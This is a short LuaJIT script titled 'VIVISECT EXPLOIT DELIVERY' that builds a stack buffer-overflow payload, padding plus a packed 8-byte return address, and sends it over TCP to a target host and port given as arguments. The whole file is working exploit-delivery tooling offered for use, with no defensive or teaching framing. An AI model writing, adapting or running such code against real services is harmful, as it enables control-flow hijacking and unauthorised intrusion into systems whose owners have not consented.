#!/usr/bin/env luajit
-- network/deliver.lua - Send exploits to remote targets

local socket = require("socket")

local function deliver_payload(host, port, payload)
    print(string.format("[*] Connecting to %s:%d", host, port))
    
    local sock = socket.tcp()
    sock:settimeout(5)
    
    local ok, err = sock:connect(host, port)
    if not ok then
        print("[-] Connection failed: " .. tostring(err))
        return false
    end
    
    print(string.format("[+] Connected. Sending %d bytes...", #payload))
    sock:send(payload)
    
    -- Try to receive response
    local response = sock:receive("*a")
    if response then
        print("[+] Response received:")
        print(response:sub(1, 200))
    end
    
    sock:close()
    print("[+] Payload delivered")
    return true
end

-- Build a simple ROP payload
local function build_payload(buffer_size, return_addr)
    local payload = string.rep("A", buffer_size)
    
    -- Pack return address (little-endian)
    local addr = ""
    for i = 0, 7 do
        local byte = bit.band(bit.rshift(return_addr, i * 8), 0xFF)
        addr = addr .. string.char(byte)
    end
    
    payload = payload .. addr
    return payload
end

-- Main
local host = arg[1] or "127.0.0.1"
local port = tonumber(arg[2]) or 4444
local buf_size = tonumber(arg[3]) or 64
local ret_addr = tonumber(arg[4], 16) or 0x401234

print([[
╔══════════════════════════════════════════╗
║     VIVISECT EXPLOIT DELIVERY v1.0      ║
╚══════════════════════════════════════════╝
]])

local payload = build_payload(buf_size, ret_addr)
deliver_payload(host, port, payload)
